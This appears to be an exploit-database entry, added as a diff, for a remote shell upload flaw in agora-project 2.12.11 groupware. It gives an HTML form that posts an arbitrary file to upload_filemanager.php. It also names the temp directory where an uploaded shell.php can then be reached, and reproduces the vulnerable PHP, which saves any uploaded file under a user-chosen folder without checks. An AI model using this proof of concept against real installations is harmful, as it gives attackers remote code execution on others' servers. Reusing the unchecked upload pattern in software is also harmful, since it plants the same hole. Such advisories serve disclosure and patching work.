@@ -1,0 +1,56 @@
+# Exploit Title: agora-project_2.12.11_12-2011 Remote Shell Upload
+# Google Dork: n0 N0obs
+# Date: 10/06/2012
+# Exploit Author: Misa3l
+# Vendor Homepage: http://sourceforge.net/projects/agora-project/
+# Software Link: http://sourceforge.net/projects/agora-project/files/latest/download
+# Version: 2.12.11_12-2011
+# Tested on: Debian 6.0
+
+Description
+
+Agora-Project is an intuitive groupware under GPL (Based on PHP/MySQL). It contains many modules: File Manager (with versioning), Calendars (with resource calendars), Task Manager, Bookmark manager, Contacts, News, Forum, Instant Messaging, etc.
+
+Exploit
+
+**********************************************************************************
+
+<form action="http://127.0.0.1/labs/module_fichier/upload/upload_filemanager.php?dossierup=testing" ENCTYPE="multipart/form-data" method="post">
+<input type="file" name="dossierup" />
+<input type="submit" name="sube" />
+</form>
+
+**********************************************************************************
+
+Dir Shell:
+http://127.0.0.1/labs/stock_fichiers/tmp/  
+"testing" <--- folder 
+"shell.php" <--- shell
+File Vul:
+module_fichier/upload/upload_filemanager.php
+
+<?php
+////    INIT
+define("ROOT_PATH","../../");
+require_once ROOT_PATH."includes/global.inc.php";
+
+////    AJOUTE LES FICHIERS UPLOADES AVEC PLUPLOAD DANS UN DOSSIER TEMPORAIRE
+////
+if(@$_GET["dossierup"]!="" && isset($_FILES) && count($_FILES)>0)
+{
+    ////    DOSSIER TEMPORAIRE  (Cr?? si inexistant + chmod (car s'il est pass? dans mkdir() ?a marche pas!))
+    $save_path = PATH_TMP.$_GET["dossierup"];
+    if(is_dir($save_path)==false)    { mkdir($save_path);  chmod($save_path, 0775); }
+    
+    ////    PLACE LE/LES FICHIERS
+    foreach($_FILES as $file_tmp)
+    {
+        if($file_tmp["error"]==0 && is_writable($save_path))    { move_uploaded_file($file_tmp["tmp_name"], $save_path."/".$file_tmp["name"]); }
+        elseif($num_erreur==4)                                    { echo "UPLOAD_ERR_NO_FILE"; }
+        else                                                    { echo $trad["MSG_ALERTE_taille_fichier"]; }
+    }
+}
+?>
+
+***************************************************************************************
+End... Misa3l From Venezuela
